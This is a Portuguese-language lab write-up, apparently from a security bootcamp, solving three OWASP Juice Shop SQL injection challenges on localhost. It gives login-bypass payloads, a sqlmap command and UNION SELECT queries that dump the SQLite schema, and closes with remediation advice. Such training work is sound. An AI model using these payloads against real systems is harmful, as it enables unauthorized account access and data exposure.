---

<div align="center">

## SQL Injection

</div>

SQL Injection (SQLi) é uma das vulnerabilidades mais comuns e perigosas em aplicações web. Ela ocorre quando um atacante consegue inserir ou manipular comandos SQL dentro de uma consulta feita ao banco de dados. Isso pode permitir que o atacante acesse, modifique, ou até exclua dados no banco de dados, muitas vezes sem a permissão adequada.

### 1. Login Admin (Login Admin ⭐⭐)

Para verificar se é possível obter acesso administrativo explorando uma vulnerabilidade de SQL Injection, inicie acessando a página de **Login**.

```
http://localhost:3000/#/login
```

Copie e cole o texto a seguir nos campos de **E-mail** e **Senha**.
```
' OR 1 -- -
```

Clique em `Login`. Agora, você deve ser capaz de obter acesso administrativo, mesmo sem possuir as credenciais apropriadas.

![Admin Profile](https://github.com/CamilaSCodes/projeto-3-bootcamp-infosec/blob/main/imagens-vulnerabilidades/Admin%20Profile.png)

### 2. Login Bender (Login Bender ⭐⭐⭐)

Vamos tentar explorar a vulnerabilidade de SQL Injection (SQLi) para acessar a conta de um usuário comum.

Na **Página Inicial** do Juice Shop, ao clicar em um produto, você pode acessar os feedbacks deixados por outros usuários, bem como o e-mail deles. Por exemplo, no produto **Banana Juice (1000ml)**, você encontrará o e-mail do usuário Bender.

```
bender@juice-sh.op
```

Sabendo disso, acesse a página de **Login**. No campo de **E-mail**, insira o e-mail de Bender com "'--" no final: `bender@juice-sh.op'--`. 

Em seguida, digite qualquer senha e clique em `Login`.

Assim, você deverá conseguir acessar a conta de Bender, mesmo que tenha utilizado uma senha aleatória.

![Bender](https://github.com/CamilaSCodes/projeto-3-bootcamp-infosec/blob/main/imagens-vulnerabilidades/Bender.png)

### 3. Esquema do Banco de Dados (Database Schema ⭐⭐⭐)

No Kali Linux, abra o **Burp Suite** e, no menu **Proxy**, clique em `Open browser`. Em seguida, inicie uma **Pesquisa** no Juice Shop.

```
http://localhost:3000/#/search
```

Retorne ao **Burp Suite**, clique em `Intercept is off` e volte ao Browser. Atualize a página.

Novamente, retorne ao **Burp** e clique em `Forward` até que a primeira linha do texto se torne `GET /rest/products/search?q= HTTP/1.1`.

Após isso, precisamos identificar o tipo do banco de dados e localizar possíveis pontos de vulnerabilidade. Para essa tarefa, utilizaremos o **sqlmap**.

Abra o terminal do Kali Linux e execute o comando abaixo.

```
sqlmap -u http://localhost:3000/rest/products/search?q= --level=3 –risk=3 –time-sec=2
```

Retorne ao **Burp Suite**, navegue até o menu **Repeater** e altere a primeira linha do texto conforme o que foi encontrado pelo **sqlmap**.

```
GET /rest/products/search?q=’)) UNION SELECT ‘1’ FROM sqlite_master-- HTTP/1.1
```

Agora, clique em `Send` para confirmar o código 400. 

Em seguida, volte ao Browser e complete a URL encontrada.

```
http://localhost:3000/rest/products/search?q=’)) UNION SELECT ‘1’ FROM sqlite_master--
```

Você receberá um erro informando: _SELECTs to the left and right of UNION ALL do not have the same number of result columns_. 

Para resolver esse erro, é necessário adicionar colunas ao SELECT até que ambos os lados da cláusula UNION ALL tenham o mesmo número de colunas. Continue adicionando colunas até que o erro esteja resolvido. No caso, adicione colunas até o número 9.

```
http://localhost:3000/rest/products/search?q=’)) UNION SELECT ‘1’,‘2’, ‘3’, ‘4’, ‘5’, ‘6’, ‘7’, ‘8’, ‘9’ FROM sqlite_master--
```

O erro foi resolvido e agora os dados estão visíveis. Para finalizar, basta substituir o " '1' " na URL por "sql".

```
http://localhost:3000/rest/products/search?q=’)) UNION SELECT sql,‘2’, ‘3’, ‘4’, ‘5’, ‘6’, ‘7’, ‘8’, ‘9’ FROM sqlite_master--
```

Aperte `Enter` e todas as informações sobre o esquema do banco de dados estarão visíveis.

![Database Schema](https://github.com/CamilaSCodes/projeto-3-bootcamp-infosec/blob/main/imagens-vulnerabilidades/Database%20Schema.png)

---

<div align="center">

### Recomendações

</div>

**1. Use Prepared Statements e Parameterized Queries:** Sempre que possível, utilize consultas parametrizadas. Em vez de construir consultas SQL com strings, utilize métodos que permitem passar parâmetros de forma segura.

**2. Use Stored Procedures:** Em alguns casos, stored procedures (procedimentos armazenados) podem ajudar a prevenir SQL injection, desde que não construam consultas dinâmicas com concatenação de strings.

**3. Validação e Sanitização de Entrada:** Valide e sanitiza todas as entradas do usuário. Certifique-se de que os dados estão no formato esperado antes de processá-los. Use listas de permissões para aceitar apenas valores esperados e rejeitar entradas maliciosas.

**4. Limitar Privilégios do Banco de Dados:** Configure o banco de dados para que as contas de usuário tenham apenas os privilégios necessários. Não permita que a aplicação se conecte com uma conta que tenha permissões administrativas, a menos que seja estritamente necessário.

---
